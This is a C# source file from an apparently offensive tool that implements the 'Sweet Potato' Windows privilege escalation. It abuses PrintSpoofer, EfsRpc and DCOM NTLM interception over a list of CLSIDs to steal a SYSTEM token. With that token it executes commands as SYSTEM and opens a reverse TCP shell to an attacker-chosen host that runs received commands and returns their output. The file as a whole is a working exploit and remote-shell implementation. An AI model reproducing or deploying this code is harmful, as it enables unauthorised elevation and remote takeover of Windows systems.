using System.Diagnostics;
using System.Management;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using static TotalPotato.ImpersonationToken;

namespace TotalPotato
{
    public class SweetPotato : IPotatoes
    {
        public string Name => "Sweet Potato";
        public string Description => "COM Elevation Variant";

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // Constants for handle flags
        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
        private const uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;

        // Constants for CreateProcessAsUser
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const int STARTF_USESTDHANDLES = 0x00000100;
        private const uint INFINITE = 0xFFFFFFFF;

        [DllImport("ntdll.dll")]
        public static extern int NtSetInformationProcess(
            IntPtr ProcessHandle,
            int ProcessInformationClass,
            ref IntPtr ProcessInformation,
            int ProcessInformationLength
        );

        // Process-related constants and functions
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        // Additional CLSIDs that might work
        private static readonly string[] AdditionalClsIds = new string[]
        {
            "00000000-0000-0000-C000-000000000046", // IUnknown
            "00000306-0000-0000-C000-000000000046", // JuicyPotato
            "8BC3F05E-D86B-11D0-A075-00C04FB68820", // PrintSpooferNet
            "D99E6E73-FC88-11D0-B498-00A0C90312F3", // ShellServiceHost
            "0289a7c5-91bf-4547-81ae-fec91a89dec5", // RoguePotato
            "7AB36653-1796-484B-BDFA-E74F1DB7C1DC"  // IColorDataProxy
        };

        // Configurable timeouts
        private int CommandTimeout = 30000;  // 30 seconds for commands
        private int ShellTimeout = 300000;   // 5 minutes for shell connections
        private int ConnectionTimeout = 10000; // 10 seconds for TCP connections

        public bool IsApplicable()
        {
            var osVersion = OSVersionHandler.GetOSVersion(); // Returns System.Version
            int build = osVersion.Build;
            int major = osVersion.Major;

            // SweetPotato generally works on Win7+ but fails on newer systems and patched builds
            bool isWindows7OrLater = major >= 6; // Windows 7 is 6.1, Windows 10 is 10.0
            bool isSupportedBuild = build <= 22000; // Windows 11 is build 22000+

            // Known KBs that patch or break SweetPotato behavior (sample list)
            string[] patchKBs = new string[]
            {
                "KB5004442", // DCOM hardening
                "KB5018410", // Additional COM protections
                "KB5021233", // Seen breaking various potato exploits
                "KB5022282"
            };

            bool isPatched = false;

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT HotFixID FROM Win32_QuickFixEngineering"))
                {
                    var hotfixes = searcher.Get()
                                           .Cast<ManagementObject>()
                                           .Select(hf => hf["HotFixID"]?.ToString())
                                           .Where(id => !string.IsNullOrEmpty(id))
                                           .ToList();

                    foreach (string patch in patchKBs)
                    {
                        if (hotfixes.Contains(patch, StringComparer.OrdinalIgnoreCase))
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine($"[!] Patch {patch} is installed. System likely NOT vulnerable to SweetPotato.");
                            Console.ResetColor();
                            isPatched = true;
                            break;
                        }
                    }

                    if (!isPatched)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("[*] No known SweetPotato patch KBs detected.");
                        Console.ResetColor();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[X] Failed to check hotfixes: {ex.Message}");
                Console.ResetColor();
            }

            return isWindows7OrLater && isSupportedBuild && !isPatched;
        }

        public bool Execute(string command, string rev_host, int rev_port)
        {
            // Main CLSIDs to try first
            string[] primaryClsIds = new string[] {
                "4991D34B-80A1-4291-83B6-3328366B9097", // BITS
                "F087771F-D74F-4C1A-BB8A-E16ACA9124EA", // IMonikerActivator
                "C49E32C6-BC8B-11D2-85D4-00105A1F8304"  // Windows Update
            };

            // Combine primary and additional CLSIDs
            List<string> allClsIds = new List<string>(primaryClsIds);
            allClsIds.AddRange(AdditionalClsIds);

            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;

            try
            {
                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if (!hasImpersonate && !hasPrimary)
                {
                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing. Are you running under a Service account?");
                    return false;
                }

                if (executionMethod == ExecutionMethod.Auto)
                {
                    if (hasImpersonate)
                    {
                        executionMethod = ExecutionMethod.Token;
                    }
                    else if (hasPrimary)
                    {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                bool exploitSuccess = false;
                PotatoAPI potatoAPI = null;

                // First try named pipe methods as they're often more reliable
                if (TryNamedPipeExploits(out potatoAPI))
                {
                    exploitSuccess = true;
                    Console.WriteLine("[+] Named pipe exploitation succeeded");
                }
                // If named pipe methods fail, try DCOM with various CLSIDs
                else
                {
                    Console.WriteLine("[*] Named pipe methods failed, trying DCOM with multiple CLSIDs");
                    // Try each CLSID until one works
                    foreach (string clsId in allClsIds)
                    {
                        Console.WriteLine($"[+] Attempting DCOM NTLM interception with CLSID {clsId} on port {port}");

                        // For DCOM mode, create a new PotatoAPI instance with the current CLSID
                        potatoAPI = new PotatoAPI(new Guid(clsId), port, PotatoAPI.Mode.DCOM);

                        // Try to trigger the exploit
                        if (potatoAPI.Trigger())
                        {
                            // Check if token was successfully obtained
                            if (potatoAPI.Token != IntPtr.Zero)
                            {
                                Console.WriteLine($"[+] Successfully obtained token using CLSID: {clsId}");
                                exploitSuccess = true;
                                break;
                            }
                            else
                            {
                                Console.WriteLine($"[!] Failed to obtain a valid token with CLSID: {clsId}");
                            }
                        }
                        else
                        {
                            Console.WriteLine($"[!] No authenticated interception took place with CLSID: {clsId}");
                        }

                        // Slight delay before trying the next CLSID
                        Thread.Sleep(500);
                    }
                }

                // If none of the methods worked, exit
                if (!exploitSuccess || potatoAPI == null || potatoAPI.Token == IntPtr.Zero)
                {
                    Console.WriteLine("[!] All exploitation methods failed. Exploit unsuccessful.");
                    return false;
                }

                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary = IntPtr.Zero;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary))
                {
                    Console.WriteLine("[!] Failed to duplicate security context token");
                    return false;
                }

                // Use ManualResetEvent to signal when the thread is done
                using (ManualResetEvent threadDone = new ManualResetEvent(false))
                {
                    // Create a class-level variable to store output
                    string resultOutput = string.Empty;

                    Thread systemThread = new Thread(() =>
                    {
                        try
                        {
                            // Try using ImpersonateLoggedOnUser instead of SetThreadToken
                            if (!ImpersonateLoggedOnUser(potatoAPI.Token))
                            {
                                int error = Marshal.GetLastWin32Error();
                                Console.WriteLine($"[!] ImpersonateLoggedOnUser failed with error code: {error}");
                                threadDone.Set();
                                return;
                            }

                            WindowsIdentity identity = WindowsIdentity.GetCurrent(true);
                            Console.WriteLine($"[+] Current identity after impersonation: {identity.Name}");

                            // For command execution with output capture
                            if (!string.IsNullOrEmpty(command))
                            {
                                ExecuteCommandWithSystemToken(impersonatedPrimary, command, out resultOutput);
                                Console.WriteLine("[+] Command executed successfully");
                                Console.WriteLine("[+] Output:");
                                Console.WriteLine(resultOutput);
                            }

                            // If reverse host and port are provided, establish a TCP connection
                            if (!string.IsNullOrEmpty(rev_host) && rev_port > 0)
                            {
                                try
                                {
                                    RunTcpShellWithSystemToken(impersonatedPrimary, rev_host, rev_port);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"[!] Failed to establish reverse connection: {ex.Message}");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] Error in impersonation thread: {ex.Message}");
                        }
                        finally
                        {
                            // Revert to original token when done
                            try
                            {
                                RevertToSelf();
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[!] Failed to revert impersonation: {ex.Message}");
                            }

                            // Always signal that we're done, even if an exception occurred
                            threadDone.Set();
                        }
                    });

                    // Start thread and wait for it to complete
                    systemThread.Start();

                    // Wait for the thread to complete its work with a reasonable timeout
                    if (!threadDone.WaitOne(ShellTimeout)) // 5 minute timeout
                    {
                        Console.WriteLine("[!] Thread execution timed out");
                    }
                    else
                    {
                        Console.WriteLine("[+] Execution completed");
                    }
                }

                // Clean up
                if (impersonatedPrimary != IntPtr.Zero)
                {
                    CloseHandle(impersonatedPrimary);
                }
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Failed to exploit COM: {0}", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
                return false;
            }
        }

        private bool TryNamedPipeExploits(out PotatoAPI potatoAPI)
        {
            potatoAPI = null;
            ushort port = 6666;

            try
            {
                // Try PrintSpoofer first
                Console.WriteLine("[+] Attempting PrintSpoofer named pipe impersonation technique");
                potatoAPI = new PotatoAPI(Guid.Empty, port, PotatoAPI.Mode.PrintSpoofer);

                if (potatoAPI.Trigger() && potatoAPI.Token != IntPtr.Zero)
                {
                    Console.WriteLine("[+] PrintSpoofer exploitation succeeded");
                    return true;
                }

                // Try EfsRpc next
                Console.WriteLine("[+] PrintSpoofer failed, trying EfsRpc technique");
                potatoAPI = new PotatoAPI(Guid.Empty, port, PotatoAPI.Mode.EfsRpc);

                if (potatoAPI.Trigger() && potatoAPI.Token != IntPtr.Zero)
                {
                    Console.WriteLine("[+] EfsRpc exploitation succeeded");
                    return true;
                }

                Console.WriteLine("[!] Named pipe exploitation techniques failed");
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error in named pipe exploitation: {ex.Message}");
                return false;
            }
        }

        private bool ExecuteCommandWithSystemToken(IntPtr tokenHandle, string command, out string output)
        {
            output = string.Empty;

            // Create pipes for stdout and stderr
            IntPtr hStdOutRead = IntPtr.Zero;
            IntPtr hStdOutWrite = IntPtr.Zero;
            IntPtr hStdErrRead = IntPtr.Zero;
            IntPtr hStdErrWrite = IntPtr.Zero;

            try
            {
                // Set up security attributes for pipe handles to be inherited
                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                // Create stdout pipe
                if (!CreatePipe(out hStdOutRead, out hStdOutWrite, ref saAttr, 0))
                {
                    Console.WriteLine($"[!] Failed to create stdout pipe: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Set stdout handle as not inheritable
                if (!SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0))
                {
                    Console.WriteLine($"[!] Failed to set stdout handle information: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Create stderr pipe
                if (!CreatePipe(out hStdErrRead, out hStdErrWrite, ref saAttr, 0))
                {
                    Console.WriteLine($"[!] Failed to create stderr pipe: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Set stderr handle as not inheritable
                if (!SetHandleInformation(hStdErrRead, HANDLE_FLAG_INHERIT, 0))
                {
                    Console.WriteLine($"[!] Failed to set stderr handle information: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Set up startup info for the process
                STARTUPINFO startupInfo = new STARTUPINFO();
                startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                startupInfo.dwFlags = STARTF_USESTDHANDLES;
                startupInfo.hStdOutput = hStdOutWrite;
                startupInfo.hStdError = hStdErrWrite;

                // Set working directory to System32 to avoid UNC path issues
                string workingDir = Environment.GetFolderPath(Environment.SpecialFolder.System);

                // Create process with the token
                PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
                string cmdLine = $"cmd.exe /c {command}";

                bool success = CreateProcessAsUserW(
                    tokenHandle,
                    null,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    true,
                    CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    workingDir,
                    ref startupInfo,
                    out processInfo);

                if (!success)
                {
                    Console.WriteLine($"[!] CreateProcessAsUserW failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Close pipe write handles - this is important so ReadFile doesn't hang
                CloseHandle(hStdOutWrite);
                hStdOutWrite = IntPtr.Zero;
                CloseHandle(hStdErrWrite);
                hStdErrWrite = IntPtr.Zero;

                // Read output from the process using an improved method
                StringBuilder stdoutBuilder = ReadPipeToEnd(hStdOutRead);
                StringBuilder stderrBuilder = ReadPipeToEnd(hStdErrRead);

                // Wait for process to exit with a timeout
                uint waitResult = WaitForSingleObject(processInfo.hProcess, (uint)CommandTimeout);

                if (waitResult == 0x102) // WAIT_TIMEOUT
                {
                    Console.WriteLine("[!] Process execution timed out, terminating process");
                    TerminateProcess(processInfo.hProcess, 1);
                }

                // Get exit code
                uint exitCode = 0;
                GetExitCodeProcess(processInfo.hProcess, out exitCode);

                // Combine output
                output = stdoutBuilder.ToString();
                string errorOutput = stderrBuilder.ToString();

                if (!string.IsNullOrEmpty(errorOutput))
                {
                    output += "\nERROR: " + errorOutput;
                }

                // Add exit code if non-zero
                if (exitCode != 0)
                {
                    output += $"\n[Process exited with code: {exitCode}]";
                }

                // Clean up process handles
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error executing command: {ex.Message}");
                output = $"ERROR: {ex.Message}";
                return false;
            }
            finally
            {
                // Clean up pipe handles
                if (hStdOutRead != IntPtr.Zero) CloseHandle(hStdOutRead);
                if (hStdOutWrite != IntPtr.Zero) CloseHandle(hStdOutWrite);
                if (hStdErrRead != IntPtr.Zero) CloseHandle(hStdErrRead);
                if (hStdErrWrite != IntPtr.Zero) CloseHandle(hStdErrWrite);
            }
        }

        private StringBuilder ReadPipeToEnd(IntPtr pipeHandle)
        {
            StringBuilder output = new StringBuilder();
            byte[] buffer = new byte[4096];
            uint bytesRead = 0;
            bool success;

            do
            {
                success = ReadFile(pipeHandle, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
                if (success && bytesRead > 0)
                {
                    output.Append(Encoding.Default.GetString(buffer, 0, (int)bytesRead));
                }
            } while (success && bytesRead > 0);

            return output;
        }

        private void RunTcpShellWithSystemToken(IntPtr tokenHandle, string host, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    Console.WriteLine($"[+] Connecting to {host}:{port}");

                    // Connect with timeout
                    var connectResult = client.BeginConnect(host, port, null, null);
                    bool connectionSuccess = connectResult.AsyncWaitHandle.WaitOne(ConnectionTimeout);

                    if (!connectionSuccess)
                    {
                        throw new TimeoutException("Connection attempt timed out");
                    }

                    // Complete the connection
                    client.EndConnect(connectResult);

                    Console.WriteLine("[+] Connection established!");

                    // Configure timeouts
                    client.ReceiveTimeout = ConnectionTimeout;
                    client.SendTimeout = ConnectionTimeout;

                    using (NetworkStream stream = client.GetStream())
                    using (StreamReader reader = new StreamReader(stream))
                    using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                    {
                        // Get current identity information
                        WindowsIdentity identity = WindowsIdentity.GetCurrent(true);

                        // Send initial connection info
                        writer.WriteLine($"[+] Elevated connection established from {Environment.MachineName} - {identity.Name}");
                        writer.WriteLine($"[+] OS Version: {Environment.OSVersion}");
                        writer.WriteLine($"[+] Using token handle: 0x{tokenHandle.ToInt64():X}");

                        // Command execution loop
                        while (IsClientConnected(client))
                        {
                            try
                            {
                                // Read command from the server
                                string command = reader.ReadLine();

                                if (string.IsNullOrEmpty(command))
                                    continue;

                                if (command.ToLower() == "exit")
                                    break;

                                // Special command to verify token
                                if (command.ToLower() == "whoami")
                                {
                                    writer.WriteLine($"Current identity: {identity.Name}");
                                    writer.WriteLine("[END_OF_OUTPUT]");
                                    continue;
                                }

                                // Execute command using the system token
                                string cmdOutput;
                                bool success = ExecuteCommandWithSystemToken(tokenHandle, command, out cmdOutput);

                                // Send the result back
                                if (success)
                                {
                                    writer.WriteLine(cmdOutput);
                                }
                                else
                                {
                                    writer.WriteLine($"[!] Failed to execute command");
                                }
                                writer.WriteLine("[END_OF_OUTPUT]"); // Marker for end of output
                            }
                            catch (IOException ex) // Handle network errors
                            {
                                if (!IsClientConnected(client))
                                {
                                    Console.WriteLine("[!] Connection lost");
                                    break;
                                }

                                try
                                {
                                    writer.WriteLine($"[!] I/O error: {ex.Message}");
                                    writer.WriteLine("[END_OF_OUTPUT]");
                                }
                                catch
                                {
                                    break; // Can't write, connection is definitely gone
                                }
                            }
                            catch (Exception ex)
                            {
                                try
                                {
                                    writer.WriteLine($"[!] Error executing command: {ex.Message}");
                                    writer.WriteLine("[END_OF_OUTPUT]");
                                }
                                catch
                                {
                                    break; // Connection is gone
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Failed to connect to TCP: {0}", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }

        private bool IsClientConnected(TcpClient client)
        {
            try
            {
                if (client == null || !client.Connected)
                    return false;

                // Check if the client is still connected using polling
                if (client.Client.Poll(0, SelectMode.SelectRead))
                {
                    byte[] buff = new byte[1];
                    if (client.Client.Receive(buff, SocketFlags.Peek) == 0)
                    {
                        // Client disconnected
                        return false;
                    }
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        #region Additional P/Invoke methods for process creation

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
            ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead,
            out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        #endregion
    }
}